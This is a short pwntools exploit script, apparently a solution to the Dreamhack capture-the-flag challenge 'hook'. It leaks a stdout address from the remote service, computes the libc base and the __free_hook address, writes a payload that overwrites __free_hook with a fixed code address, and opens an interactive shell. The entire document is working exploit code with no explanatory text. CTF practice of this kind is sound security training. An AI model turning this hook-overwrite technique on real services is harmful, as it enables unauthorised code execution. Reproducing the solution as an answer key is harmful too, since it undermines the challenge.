from pwn import *

def slog(name, addr): 
    return success(': '.join([name, hex(addr)]))

p = remote('host3.dreamhack.games', 15193)
e = ELF('./hook')
libc = ELF('./libc-2.23.so')

# [1] Leak libc_base
p.recvuntil(b'stdout: ')

stdout = int(p.recvline()[:-1], 16)
lb = stdout - (libc.symbols["_IO_2_1_stdout_"])
free_hook = lb + libc.symbols['__free_hook']

payload = p64(free_hook) + p64(0x400a11)

p.sendlineafter(b"Size: ", b'400')
p.sendlineafter(b'Data: ', payload)

p.interactive()